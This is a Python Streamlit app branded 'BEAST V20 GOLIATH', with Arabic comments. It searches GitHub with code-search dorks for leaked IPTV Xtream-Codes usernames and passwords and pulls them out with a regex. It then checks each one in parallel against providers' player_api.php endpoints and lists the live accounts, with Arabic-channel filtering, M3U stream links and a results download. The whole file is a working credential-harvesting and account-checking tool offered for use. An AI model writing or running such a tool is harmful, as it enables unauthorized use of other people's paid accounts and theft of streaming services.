import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures

# =================================================
# 1. إعدادات الواجهة والجماليات (The Cinematic Look)
# =================================================
st.set_page_config(page_title="BEAST V20 GOLIATH", layout="wide", page_icon="🌪️")

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
    .stApp { background-color: #05070a; color: #ffffff; }
    .main-header { font-family: 'Orbitron', sans-serif; color: #00ff41; text-align: center; font-size: 45px; text-shadow: 0 0 20px #00ff41; margin-bottom: 30px; }
    .beast-card {
        background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 65, 0.2);
        border-radius: 15px; padding: 20px; margin-bottom: 15px; backdrop-filter: blur(10px);
        transition: 0.4s; position: relative; overflow: hidden;
    }
    .beast-card:hover { border-color: #00ff41; transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0, 255, 65, 0.15); }
    .beast-card::before { content: ''; position: absolute; top: 0; right: 0; width: 5px; height: 100%; background: #00ff41; }
    .arabic-badge { background: linear-gradient(45deg, #ff4b4b, #ff0000); color: white; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
    .host-title { font-size: 18px; color: #00ff41; font-weight: bold; margin-bottom: 10px; display: block; }
    .data-line { font-family: 'Courier New', monospace; font-size: 14px; color: #ced4da; }
    .stButton>button { background: linear-gradient(45deg, #00ff41, #008f25) !important; color: black !important; font-weight: bold !important; border-radius: 10px !important; }
</style>
""", unsafe_allow_html=True)

# إدارة الحالة
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()

# =================================================
# 2. محرك الصيد العربي (The Arabic Engine)
# =================================================

def check_account(host, user, pw):
    if f"{host}{user}" in st.session_state.seen_urls: return None
    st.session_state.seen_urls.add(f"{host}{user}")
    
    try:
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=3).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            # محرك كشف المحتوى العربي الذكي
            is_arabic = False
            cat_check = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=2).text.upper()
            arabic_keywords = ["ARABIC", "BEIN", "OSN", "SSC", "SHAHID", "EGYPT", "MAGHREB", "NILESAT", "MYHD"]
            if any(k in cat_check for k in arabic_keywords): is_arabic = True
            
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
                "ar": is_arabic, "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 3. واجهة المستخدم
# =================================================
with st.sidebar:
    st.markdown("<h2 style='color:#00ff41;'>🌪️ BEAST V20 PRO</h2>", unsafe_allow_html=True)
    token = st.text_input("GitHub Token:", type="password")
    
    st.divider()
    filter_arabic = st.checkbox("عرض المحتوى العربي فقط 🔥", value=True)
    
    if st.button("🚀 ابدأ الصيد العملاق"):
        if token: st.session_state.is_hunting = True
        else: st.error("ضع التوكن!")
    
    if st.button("🛑 توقف"): st.session_state.is_hunting = False

    st.divider()
    st.metric("💎 إجمالي الصيد", len(st.session_state.results))
    
    if st.session_state.results:
        txt = ""
        for r in st.session_state.results:
            txt += f"HOST: {r['host']}\nUSER: {r['user']}\nPASS: {r['pass']}\nEXP: {r['exp']}\nARABIC: {r['ar']}\nM3U: {r['m3u']}\n" + "-"*20 + "\n"
        st.download_button("📥 تحميل النتائج بالكامل", txt, "Beast_V20_Results.txt")

st.markdown("<h1 class='main-header'>BEAST V20 GOLIATH</h1>", unsafe_allow_html=True)

# =================================================
# 4. الرادار وعرض النتائج (The Professional Grid)
# =================================================
results_area = st.empty()

def update_ui():
    with results_area.container():
        display = [i for i in st.session_state.results if not filter_arabic or i['ar']]
        
        # تقسيم النتائج لمجموعات من 3 لكل صف
        for i in range(0, len(display), 3):
            cols = st.columns(3)
            for idx, item in enumerate(display[i:i+3]):
                with cols[idx]:
                    ar_badge = '<span class="arabic-badge">ARABIC CONTENT ✅</span>' if item['ar'] else ''
                    st.markdown(f"""
                    <div class="beast-card">
                        <div style="display:flex; justify-content:space-between; align-items:start;">
                            <span class="host-title">{item['host']}</span>
                            {ar_badge}
                        </div>
                        <div class="data-line">
                            👤 <b>USER:</b> {item['user']}<br>
                            🔑 <b>PASS:</b> {item['pass']}<br>
                            📅 <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span><br>
                            👥 <b>CONN:</b> {item['conn']}
                        </div>
                        <div style="margin-top:15px; background:rgba(0,0,0,0.3); padding:8px; border-radius:5px;">
                            <code style="font-size:10px; color:#00ff41; word-break:break-all;">{item['m3u']}</code>
                        </div>
                    </div>
                    """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}'}
    # دوركات هجومية لجلب آلاف الملفات
    dorks = [
        'extension:txt "get.php?username=" "password=" ARABIC',
        'extension:m3u "get.php?username=" "password=" SSC',
        'filename:iptv.txt "http" BEIN',
        'filename:shahid.txt',
        'extension:txt "player_api.php" OSN'
    ]
    
    for dork in dorks:
        if not st.session_state.is_hunting: break
        for page in range(1, 10): # سيبحث في أول 10 صفحات لكل دورك
            if not st.session_state.is_hunting: break
            try:
                r = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100", headers=headers).json()
                if 'items' in r:
                    for item in r['items']:
                        raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        content = requests.get(raw, timeout=3).text
                        matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                        
                        # استخدام ThreadPool لسرعة البرق في الفحص
                        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                            future_to_check = {executor.submit(check_account, m[0], m[1], m[2]): m for m in matches}
                            for future in concurrent.futures.as_completed(future_to_check):
                                found = future.result()
                                if found:
                                    st.session_state.results.insert(0, found)
                                    update_ui()
            except: continue
    st.session_state.is_hunting = False
else:
    update_ui()
